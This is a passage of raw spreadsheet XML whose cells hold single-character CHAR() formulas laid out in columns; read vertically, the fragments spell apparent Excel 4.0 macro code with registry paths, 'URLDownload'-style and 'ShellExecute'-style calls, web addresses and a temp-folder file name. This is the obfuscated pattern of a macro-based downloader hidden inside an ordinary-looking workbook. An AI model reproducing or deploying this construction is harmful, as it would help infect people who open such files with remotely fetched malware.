        <v>.s</v>
      </c>
      <c r="M82" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="N82" s="1" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="O82" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="83" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C83" t="s">
        <v>3</v>
      </c>
      <c r="D83" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="K83" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="L83" s="1" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
      <c r="M83" t="str">
        <f>CHAR(47)</f>
        <v>/</v>
      </c>
      <c r="N83" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="O83" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
    </row>
    <row r="84" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C84" s="1" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
      <c r="D84" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="L84" s="1" t="str">
        <f>CHAR(47)</f>
        <v>/</v>
      </c>
      <c r="M84" t="str">
        <f>CHAR(47)</f>
        <v>/</v>
      </c>
      <c r="N84" t="s">
        <v>3</v>
      </c>
      <c r="O84" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="85" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C85" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="D85" t="s">
        <v>3</v>
      </c>
      <c r="L85" s="1" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="M85" t="s">
        <v>3</v>
      </c>
      <c r="N85" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O85" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="86" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C86" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="D86" t="str">
        <f>CHAR(109)</f>
        <v>m</v>
      </c>
      <c r="L86" t="s">
        <v>3</v>
      </c>
      <c r="M86" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="N86" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="O86" s="1" t="str">
        <f>CHAR(109)</f>
        <v>m</v>
      </c>
    </row>
    <row r="87" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C87" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="D87" t="str">
        <f>CHAR(51)</f>
        <v>3</v>
      </c>
      <c r="L87" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="M87" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="N87" s="1" t="str">
        <f>CHAR(120)</f>
        <v>x</v>
      </c>
      <c r="O87" s="1" t="str">
        <f>CHAR(51)</f>
        <v>3</v>
      </c>
    </row>
    <row r="88" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C88" t="s">
        <v>3</v>
      </c>
      <c r="D88" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="L88" s="1" t="str">
        <f>CHAR(45)</f>
        <v>-</v>
      </c>
      <c r="M88" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="N88" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="O88" s="1" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
    </row>
    <row r="89" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C89" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="D89" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="L89" s="1" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="M89" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="N89" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O89" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="90" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C90" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="D90" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="L90" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="M90" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="N90" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="O90" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="91" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C91" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="D91" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="L91" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="M91" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
      <c r="N91" t="s">
        <v>3</v>
      </c>
      <c r="O91" s="1" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
    </row>
    <row r="92" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C92" s="1" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="D92" t="s">
        <v>3</v>
      </c>
      <c r="L92" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="M92" t="s">
        <v>3</v>
      </c>
      <c r="N92" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O92" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="93" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C93" t="s">
        <v>3</v>
      </c>
      <c r="D93" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
      <c r="L93" t="s">
        <v>3</v>
      </c>
      <c r="M93" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="N93" s="1" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
      <c r="O93" s="1" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
    </row>
    <row r="94" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C94" s="1" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="D94" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="L94" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="M94" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="N94" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O94" s="1" t="str">
        <f>CHAR(100)</f>
        <v>d</v>
      </c>
    </row>
    <row r="95" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C95" s="1" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="D95" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="L95" s="1" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="M95" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="N95" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="O95" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
    </row>
    <row r="96" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C96" s="1" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="D96" t="str">
        <f>CHAR(120)</f>
        <v>x</v>
      </c>
      <c r="L96" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="M96" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="N96" s="1" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="O96" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
    </row>
    <row r="97" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C97" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="D97" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="L97" s="1" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="M97" t="str">
        <f>CHAR(47)</f>
        <v>/</v>
      </c>
      <c r="N97" s="1" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="O97" s="1" t="str">
        <f>CHAR(51)</f>
        <v>3</v>
      </c>
    </row>
    <row r="98" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C98" t="s">
        <v>3</v>
      </c>
      <c r="D98" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="L98" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="M98" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="N98" t="s">
        <v>3</v>
      </c>
      <c r="O98" s="1" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
    </row>
    <row r="99" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C99" s="1" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="D99" t="s">
        <v>3</v>
      </c>
      <c r="L99" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M99" t="s">
        <v>3</v>
      </c>
      <c r="N99" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="O99" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="100" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C100" s="1" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="D100" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="L100" t="s">
        <v>3</v>
      </c>
      <c r="M100" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="N100" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O100" s="1" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
    </row>
    <row r="101" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C101" s="1" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="D101" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="L101" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="M101" t="str">
        <f>CHAR(45)</f>
        <v>-</v>
      </c>
      <c r="N101" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O101" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="102" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C102" s="1" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="D102" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="L102" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M102" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="N102" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="O102" s="1" t="str">
        <f>CHAR(120)</f>
        <v>x</v>
      </c>
    </row>
    <row r="103" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C103" s="1" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="D103" t="str">
        <f>CHAR(88)</f>
        <v>X</v>
      </c>
      <c r="L103" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="M103" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="N103" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="O103" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="104" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C104" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="D104" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="L104" s="1" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="M104" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="N104" s="1" t="str">
        <f>CHAR(39)</f>
        <v>'</v>
      </c>
      <c r="O104" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="105" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C105" t="s">
        <v>3</v>
      </c>
      <c r="D105" t="s">
        <v>3</v>
      </c>
      <c r="L105" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="M105" t="s">
        <v>3</v>
      </c>
      <c r="N105" t="s">
        <v>3</v>
      </c>
      <c r="O105" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="106" spans="3:15" x14ac:dyDescent="0.25">
      <c r="C106" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="D106" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="L106" t="s">
        <v>3</v>
      </c>
      <c r="M106" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="N106" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="O106" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
    <row r="107" spans="3:15" x14ac:dyDescent="0.25">
      <c r="D107" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="L107" s="1" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="M107" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="N107" s="1" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="O107" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
    </row>
    <row r="108" spans="3:15" x14ac:dyDescent="0.25">
      <c r="D108" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="L108" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="M108" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="N108" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="O108" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
    </row>
    <row r="109" spans="3:15" x14ac:dyDescent="0.25">
      <c r="D109" t="str">
        <f>CHAR(32)</f>
        <v xml:space="preserve"> </v>
      </c>
      <c r="L109" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="M109" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="N109" s="1" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="O109" s="1" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
    </row>
    <row r="110" spans="3:15" x14ac:dyDescent="0.25">
      <c r="D110" t="str">
        <f>CHAR(72)</f>
        <v>H</v>
      </c>
      <c r="L110" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="M110" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="N110" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="O110" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="111" spans="3:15" x14ac:dyDescent="0.25">
      <c r="D111" t="s">
        <v>3</v>
      </c>
      <c r="L111" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="M111" t="s">
        <v>3</v>
      </c>
      <c r="N111" t="s">
        <v>3</v>
      </c>
      <c r="O111" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="112" spans="3:15" x14ac:dyDescent="0.25">
      <c r="D112" t="str">
        <f>CHAR(75)</f>
        <v>K</v>
      </c>
      <c r="L112" t="s">
        <v>3</v>
      </c>
      <c r="M112" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="N112" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="O112" s="1" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
    </row>
    <row r="113" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D113" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="L113" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="M113" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N113" s="1" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="O113" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="114" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D114" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="L114" s="1" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="M114" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="N114" s="1" t="str">
        <f>CHAR(112)</f>
        <v>p</v>
      </c>
      <c r="O114" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="115" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D115" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="L115" s="1" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="M115" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="N115" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="O115" s="1" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
    </row>
    <row r="116" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D116" t="s">
        <v>3</v>
      </c>
      <c r="L116" s="1" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
      <c r="M116" t="s">
        <v>3</v>
      </c>
      <c r="N116" s="1" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="O116" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="117" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D117" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="L117" t="s">
        <v>3</v>
      </c>
      <c r="M117" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="N117" t="s">
        <v>3</v>
      </c>
      <c r="O117" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="118" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D118" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="L118" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="M118" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="N118" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="O118" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="119" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D119" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="L119" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="M119" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="N119" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="O119" s="1" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
    </row>
    <row r="120" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D120" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="L120" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="M120" t="str">
        <f>CHAR(85)</f>
        <v>U</v>
      </c>
      <c r="N120" s="1" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="O120" s="1" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
    </row>
    <row r="121" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D121" t="str">
        <f>CHAR(119)</f>
        <v>w</v>
      </c>
      <c r="L121" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="M121" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="N121" s="1" t="str">
        <f>CHAR(41)</f>
        <v>)</v>
      </c>
      <c r="O121" s="1" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
    </row>
    <row r="122" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D122" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="L122" s="1" t="str">
        <f>CHAR(99)&amp;CHAR(54)</f>
        <v>c6</v>
      </c>
      <c r="M122" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O122" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
    </row>
    <row r="123" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D123" t="s">
        <v>3</v>
      </c>
      <c r="L123" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="M123" t="s">
        <v>3</v>
      </c>
      <c r="O123" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="124" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D124" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="L124" t="s">
        <v>3</v>
      </c>
      <c r="M124" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="O124" s="1" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
    </row>
    <row r="125" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D125" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="L125" s="1" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
      <c r="M125" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="O125" s="1" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
    </row>
    <row r="126" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D126" t="s">
        <v>3</v>
      </c>
      <c r="L126" s="1" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="M126" t="s">
        <v>3</v>
      </c>
      <c r="O126" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="127" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D127" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="L127" t="s">
        <v>3</v>
      </c>
      <c r="M127" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="O127" s="1" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
    </row>
    <row r="128" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D128" t="str">
        <f>CHAR(77)</f>
        <v>M</v>
      </c>
      <c r="L128" s="1" t="str">
        <f>CHAR(53)</f>
        <v>5</v>
      </c>
      <c r="M128" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="O128" s="1" t="str">
        <f>CHAR(99)&amp;CHAR(54)</f>
        <v>c6</v>
      </c>
    </row>
    <row r="129" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D129" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="L129" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="M129" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="O129" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
    </row>
    <row r="130" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D130" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="L130" s="1" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="M130" t="str">
        <f>CHAR(98)</f>
        <v>b</v>
      </c>
      <c r="O130" s="1" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
    </row>
    <row r="131" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D131" t="s">
        <v>3</v>
      </c>
      <c r="L131" s="1" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="M131" t="s">
        <v>3</v>
      </c>
      <c r="O131" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="132" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D132" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="L132" t="s">
        <v>3</v>
      </c>
      <c r="M132" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="O132" s="1" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
    </row>
    <row r="133" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D133" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="L133" s="1" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="M133" t="str">
        <f>CHAR(105)</f>
        <v>i</v>
      </c>
      <c r="O133" s="1" t="str">
        <f>CHAR(53)</f>
        <v>5</v>
      </c>
    </row>
    <row r="134" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D134" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="L134" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="M134" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="O134" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
    </row>
    <row r="135" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D135" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="L135" s="1" t="str">
        <f>CHAR(109)</f>
        <v>m</v>
      </c>
      <c r="M135" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="O135" s="1" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
    </row>
    <row r="136" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D136" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="L136" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="M136" s="1" t="str">
        <f>CHAR(99)&amp;CHAR(54)</f>
        <v>c6</v>
      </c>
      <c r="O136" s="1" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
    </row>
    <row r="137" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D137" t="s">
        <v>3</v>
      </c>
      <c r="L137" s="1" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M137" t="s">
        <v>3</v>
      </c>
      <c r="O137" t="s">
        <v>3</v>
      </c>
    </row>
    <row r="138" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D138" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
      <c r="L138" t="s">
        <v>3</v>
      </c>
      <c r="M138" s="1" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="O138" s="1" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
    </row>
    <row r="139" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D139" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="L139" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="M139" s="1" t="str">
        <f>CHAR(103)</f>
        <v>g</v>
      </c>
      <c r="O139" s="1" t="str">
        <f>CHAR(116)</f>
        <v>t</v>
      </c>
    </row>
    <row r="140" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D140" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="L140" s="1" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="M140" s="1" t="str">
        <f>CHAR(97)</f>
        <v>a</v>
      </c>
      <c r="O140" s="1" t="str">
        <f>CHAR(109)</f>
        <v>m</v>
      </c>
    </row>
    <row r="141" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D141" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="L141" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="M141" s="1" t="str">
        <f>CHAR(53)</f>
        <v>5</v>
      </c>
      <c r="O141" s="1" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
    </row>
    <row r="142" spans="4:15" x14ac:dyDescent="0.25">
      <c r="D142" t="str">
        <f>CHAR(102)</f>
        <v>f</v>
      </c>
      <c r="L142" s="1" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="M142" s="1" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="O142" s="1" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
    </row>
